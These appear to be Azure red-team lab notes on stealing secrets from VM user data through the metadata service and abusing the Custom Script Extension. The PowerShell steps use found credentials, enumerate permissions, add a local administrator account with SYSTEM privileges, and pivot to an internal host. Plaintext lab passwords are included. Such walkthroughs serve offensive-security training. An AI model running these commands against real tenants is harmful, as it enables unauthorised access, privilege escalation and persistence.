# Azure VMs - User Data

* Scripts or any other data that can be inserted on an Azure VM at time of provision or later.
* "Any application on the virtual machine can access the user data from the Azure Instance Metadata Service (IMDS) after provision."
* User data is
  * Persistent across reboots
  * Can be retrieved and updated without affecting the VM
  * Not encrypted and any process on the VM can access the data!
  * Should be base64 encoded and cannot be more than 64KB
* Despite clear warning in the documentation, a lot of sensitive information can be found in user data.
* Examples are, PowerShell scripts for domain join operations, postprovisioning configuration and management, on-boarding agents, scripts used by infrastructure automation tools etc.
* It is also possible to modify user data with permissions `Microsoft.Compute/virtualMachines/write` on the target VM. Any automation or scheduled task reading commands from user data can be abused!
* Modification of user data shows up in VM Activity Logs but doesn't show what change was done.

**Custom Script Extension**

* Extensions are "small applications" used to provide post deployment configuration and other management tasks. OMIGOD!
* Custom Script Extension is used to run scripts on Azure VMs.
* Scripts can be inline, fetched from a storage blob (needs managed identity) or can be downloaded.
* The script is executed with SYSTEM privileges.
* Can be deployed to a running VM.
* Only one extension can be added to a VM at a time. So it is not possible to add multiple custom script extensions to a single VM
* Following permissions are required to create a custom script extension and read the output: `Microsoft.Compute/virtualMachines/extensions/write` and `Microsoft.Compute/virtualMachines/extensions/read`
* The execution of script takes place almost immediately.

```powershell
$password = ConvertTo-SecureString 'Stud2802Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student2802', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm

$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "<http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text>"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```

```powershell
$Password = ConvertTo-SecureString 'Manag3dUserF0rVirtualM@chines' -AsPlainText -Force # Pass change
$Cred = New-Object System.Management.Automation.PSCredential('samcgray@defcorphq.onmicrosoft.com', $Password)
Connect-AzAccount -Credential $Cred

Get-AzResource
Get-AzRoleAssignment -SignInName samcgray@defcorphq.onmicrosoft.com
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv
```

```powershell
$Token = (Get-AzAccessToken).Token
$URI = '<https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01>'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value 
```

```powershell
Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student2802 Stud2802Password@123 /add /Y; net localgroup administrators student2802 /add"}'

$password = ConvertTo-SecureString 'Stud2802Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student2802', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm

$password = ConvertTo-SecureString 'Stud2802Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('.\\student2802', $Password)
$infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds
Invoke-Command -Session $infradminsrv -ScriptBlock{hostname}
Invoke-Command -Session $infradminsrv -ScriptBlock{dsregcmd /status}
```
